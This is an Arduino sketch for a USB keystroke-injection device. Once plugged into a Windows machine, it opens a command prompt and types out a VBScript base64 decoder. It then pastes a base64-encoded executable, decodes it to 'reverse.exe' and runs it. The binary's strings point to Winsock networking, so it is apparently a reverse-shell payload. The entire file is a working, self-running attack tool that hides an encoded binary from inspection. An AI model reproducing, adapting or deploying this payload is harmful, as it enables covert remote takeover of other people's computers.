#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  typeKey(KEY_LEFT_ESC);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ESC);
  Keyboard.releaseAll();

  delay(400);

  Keyboard.print("cmd");

  // DELAY 400
  // MENU
  // DELAY 400
  // STRING a
  // DELAY 600
  // LEFTARROW
  typeKey(KEY_RETURN);

  delay(400);

  Keyboard.print("copy /Y con decoder.vbs");

  typeKey(KEY_RETURN);

  Keyboard.print("Option Explicit:Dim arguments, inFile, outFile:Set arguments = WScript.Arguments:inFile = arguments(0)");

  Keyboard.print(":outFile = arguments(1):Dim base64Encoded, base64Decoded, outByteArray:dim objFS:dim objTS:set objFS =");

  Keyboard.print("CreateObject(“Scripting.FileSystemObject”):");

  typeKey(KEY_RETURN);

  Keyboard.print("set objTS = objFS.OpenTextFile(inFile, 1):base64Encoded =");

  Keyboard.print("objTS.ReadAll:base64Decoded = decodeBase64(base64Encoded):writeBytes outFile, base64Decoded:private function");

  Keyboard.print("decodeBase64(base64):");

  typeKey(KEY_RETURN);

  Keyboard.print("dim DM, EL:Set DM = CreateObject(“Microsoft.XMLDOM”):Set EL = DM.createElement(“tmp”):");

  Keyboard.print("EL.DataType = bin.base64 = base64:decodeBase64 = EL.NodeTypedValue:end function:private Sub");

  Keyboard.print("writeBytes(file, bytes):Dim binaryStream:");

  typeKey(KEY_RETURN);

  Keyboard.print("Set binaryStream = CreateObject(“ADODB.Stream”):binaryStream.Type = 1:");

  Keyboard.print("binaryStream.Open:binaryStream.Write bytes:binaryStream.SaveToFile file, 2:End Sub");

  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('z');
  Keyboard.releaseAll();

  typeKey(KEY_RETURN);

  Keyboard.print("copy /Y con reverse.txt");

  typeKey(KEY_RETURN);

  Keyboard.print("TVprZXJuZWwzMi5kbGwAAFBFAABMAQIAAAAAAAAAAAAAAAAA4AAPAQsBAAAAAgAAAAAAAAAA");

  typeKey(KEY_RETURN);

  Keyboard.print("AADfQgAAEAAAAAAQAAAAAEAAABAAAAACAAAEAAAAAAAAAAQAAAAAAAAAAFAAAAACAAAAAAAA");

  typeKey(KEY_RETURN);

  Keyboard.print("AgAAAAAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAA20IAABQAAAAAAAAAAAAAAAAA");

  typeKey(KEY_RETURN);

  Keyboard.print("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");

  typeKey(KEY_RETURN);

  Keyboard.print("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATUVXAEYS");

  typeKey(KEY_RETURN);

  Keyboard.print("0sMAMAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4AAAwALSdduKFuvUABAAAABAAADvAgAA");

  typeKey(KEY_RETURN);

  Keyboard.print("AAIAAAAAAAAAAAAAAAAAAOAAAMC+HEBAAIvera1QrZeygKS2gP8Tc/kzyf8TcxYzwP8TcyG2");

  typeKey(KEY_RETURN);

  Keyboard.print("gEGwEP8TEsBz+nU+quvg6HI+AAAC9oPZAXUO/1P86yas0eh0LxPJ6xqRSMHgCKz/U/w9AH0A");

  typeKey(KEY_RETURN);

  Keyboard.print("AHMKgPwFcwaD+H93AkFBlYvFtgBWi/cr8POkXuubrYXAdZCtlq2XVqw8AHX7/1PwlVatD8hA");

  typeKey(KEY_RETURN);

  Keyboard.print("WXTseQesPAB1+5FAUFX/U/SrdefDAAAAAAAzyUH/ExPJ/xNy+MOwQgAAvUIAAAAAAAAAQEAA");

  typeKey(KEY_RETURN);

  Keyboard.print("MAFAAAAQQAAAEEAAaBwGMkAHagHoDnw4VQzoQgLIFTiean446lMMelAsFnRBMP0Bv1WysTNq");

  typeKey(KEY_RETURN);

  Keyboard.print("kQIGsnxVmiejeINmxwVke0+mOGe8XVBmlD05ZqNofmRmfiF9i3MM2QpqaJQtoTp6b0gV6kwF");

  typeKey(KEY_RETURN);

  Keyboard.print("EVBkkBBNRFWRFDxAeGooEGhdKP81MHTopJ5RVFWhVY2/bg4KCJAiC+FRFOgfgUvD/yUkILtv");

  typeKey(KEY_RETURN);

  Keyboard.print("KhwGQxghFL3DIghxzAFVi+yBxHz+/4hWV+hgrN2JRfwzHcmLdX44PB10Bx4iQPdB6/RR0XLp");

  typeKey(KEY_RETURN);

  Keyboard.print("AOFYO8F0C19eMLgDucnCCOGGSY29PHDlQyoJzy/gArAgqutz8iiNhRU5i/A2+DMqM+sbiwNm");

  typeKey(KEY_RETURN);

  Keyboard.print("MgfvImUgTf4iEeEoLe2UCIO53LcwS3T7OzpNCKgVWWUdZwpME0EdDxTr5qoNNgcZhzj0sH/A");

  typeKey(KEY_RETURN);

  Keyboard.print("VXMRi30Mxhe4An+CohOdaLCgWDQzDUYN5tH34f5Yo+7nRLsfFqnOEQTeVQE81BTUDhszwE7s");

  typeKey(KEY_RETURN);

  Keyboard.print("hwtw0ooGRj08ArMSDvffkOsLLDAZjQyJBkiDLQrAdfHoBBEzUcI44jCDxAf0avXoaQkZSf+9");

  typeKey(KEY_RETURN);

  Keyboard.print("gqogC9Aqk3U3+FAinSmGBvzoTS9oiyQ45lMaDwiNUAMhGIPABOP5//6AAvfTI8uB4USAdHzp");

  typeKey(KEY_RETURN);

  Keyboard.print("bMEMYHV3BvQQwEAC0OEbwlFbOkfESRnKDFcGCDAAADBAAGMwbWQAZj9AABQ4IEADd3MyXzOY");

  typeKey(KEY_RETURN);

  Keyboard.print("LmRs48CAZwdldGhvc0BieW5he23PHmOePPfr/w4SV1NBXc9hckZ1cBh5aMoscxNPJmNrYu/B");

  typeKey(KEY_RETURN);

  Keyboard.print("/7gDbJUacspebEzHV9NpdPNGp7yRR8NMQ29tiGFuZDZMaURifoB2cvudOlC3gudzFUFYIcBk");

  typeKey(KEY_RETURN);

  Keyboard.print("SNBDL2AAAAAAAGY/QABMb2FkTGlicmFyeUEAR2V0UHJvY0FkZHJlc3MAAAAAAAAAAAAAAAAA");

  typeKey(KEY_RETURN);

  Keyboard.print("AAxAAADpdL7//wAAAAIAAAAMQAAA");

  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('z');
  Keyboard.releaseAll();

  typeKey(KEY_RETURN);

  Keyboard.print("cscript decoder.vbs reverse.txt reverse.exe");

  typeKey(KEY_RETURN);

  Keyboard.print("reverse.exe");

  typeKey(KEY_RETURN);

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
